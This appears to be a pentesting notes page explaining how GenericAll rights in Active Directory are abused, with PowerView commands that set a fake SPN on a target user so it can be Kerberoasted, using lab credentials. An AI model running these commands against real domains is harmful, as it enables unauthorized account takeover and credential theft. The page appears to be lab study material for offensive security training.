---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# GenericAll

## Exploitation

### Group over User

<figure><img src="../../../../.gitbook/assets/genericall_group_over_user.png" alt=""><figcaption><p>Figure 1: The Information Technology group has GenericAll rights over the user adunn.</p></figcaption></figure>

#### Targeted Kerberoasting

When a group/user has `GenericAll` rights over another account, a fake SPN can be assigned to the target account.

{% code overflow="wrap" %}
```powershell
# credentialed object for the currently owned user
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
 
# create a fake SPN for the target user
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
{% endcode %}

Once the SPN is assigned to the target account, we should be able to [Kerberoast](../attacks/kerberoasting.md) it.

#### Change user's password

Check [here](forcechangepassword.md).

```
// Some code
```

## Resources

{% tabs %}
{% tab title="BH Edge" %}
{% embed url="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall" %}
{% endtab %}
{% endtabs %}
